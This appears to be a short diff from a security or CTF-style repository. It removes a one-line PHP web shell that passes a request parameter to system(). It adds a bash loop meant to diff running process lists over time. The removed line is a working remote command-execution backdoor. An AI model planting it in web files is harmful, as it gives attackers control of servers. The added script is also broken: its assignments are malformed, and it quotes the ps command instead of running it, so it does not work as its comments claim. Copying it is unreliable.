@@ -1,2 +1,32 @@
+#! /bin/bash
 
-<?php echo system($_REQUEST[‘cmd’]); ?>
+# script runs through running processes on a server
+# and comapres old processes with new processes and 
+# return them
+
+
+#loop by line
+IFS=$'\n'    # Internal Field Separator by new line
+
+
+old_processes =$"ps -eo command"
+
+#while loop
+while true; do 
+
+	new_processes =$(ps -eo command)
+
+	#find the difference between old_processes and new_processes
+	diff <(echo "$old_processes") <(echo "$new_processes")
+	
+	sleep 1
+	
+	old_processes = new_processes
+	
+done;
+
+
+	
+	
+
+
